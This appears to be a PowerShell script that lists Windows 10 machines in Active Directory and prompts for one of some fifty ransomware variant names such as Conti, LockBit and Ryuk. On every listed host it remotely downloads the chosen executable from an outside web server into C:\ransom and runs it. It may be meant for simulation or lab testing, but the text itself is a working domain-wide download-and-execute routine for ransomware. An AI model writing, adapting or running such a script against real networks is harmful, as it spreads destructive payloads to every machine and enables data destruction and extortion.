 $computers = Get-ADComputer -Filter {operatingsystem -like "*10*"} | Select -ExpandProperty DNSHostName

Function Get-VariantType {
$type=Read-Host "
Please enter your user number"
Switch ($type){
1 {$variant_choice="avaddon-0"}
2 {$variant_choice="blackmatter-0"}
3 {$variant_choice="conti-0"}
4 {$variant_choice="darkside-0"}
5 {$variant_choice="lockbit-0"}
6 {$variant_choice="maze-0"}
7 {$variant_choice="mespinoza-0"}
8 {$variant_choice="revil-0"}
9 {$variant_choice="ryuk-0"}
10 {$variant_choice="avaddon-1"}
11 {$variant_choice="blackmatter-1"}
12 {$variant_choice="conti-1"}
13 {$variant_choice="darkside-1"}
14 {$variant_choice="lockbit-1"}
15 {$variant_choice="maze-1"}
16 {$variant_choice="mespinoza-1"}
17 {$variant_choice="revil-1"}
18 {$variant_choice="ryuk-2"}
19 {$variant_choice="avaddon-2"}
20 {$variant_choice="blackmatter-2"}
21 {$variant_choice="conti-2"}
22 {$variant_choice="darkside-2"}
23 {$variant_choice="lockbit-2"}
24 {$variant_choice="maze-2"}
25 {$variant_choice="mespinoza-2"}
26 {$variant_choice="revil-2"}
27 {$variant_choice="ryuk-3"}
28 {$variant_choice="avaddon-3"}
29 {$variant_choice="blackmatter-3"}
30 {$variant_choice="conti-3"}
31 {$variant_choice="darkside-3"}
32 {$variant_choice="lockbit-3"}
33 {$variant_choice="maze-3"}
34 {$variant_choice="mespinoza-3"}
35 {$variant_choice="revil-3"}
36 {$variant_choice="ryuk-3"}
37 {$variant_choice="avaddon-5"}
38 {$variant_choice="blackmatter-4"}
39 {$variant_choice="conti-4"}
40 {$variant_choice="darkside-4"}
41 {$variant_choice="lockbit-4"}
42 {$variant_choice="maze-4"}
43 {$variant_choice="mespinoza-4"}
44 {$variant_choice="revil-4"}
45 {$variant_choice="ryuk-5"}
46 {$variant_choice="avaddon-6"}
47 {$variant_choice="blackmatter-5"}
48 {$variant_choice="conti-5"}
49 {$variant_choice="darkside-5"}
50 {$variant_choice="babuk-5"}
}
return $variant_choice
}

$variant = Get-VariantType

Write-Output "You are riding piggie " $variant


foreach ($element in $computers) {

$x = [array]::IndexOf($computers,$element)
$filename = $variant + ".exe"

Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/tuskcon/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
Start-Sleep 15
Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Start-Process C:\ransom\$Using:filename -Wait}
}
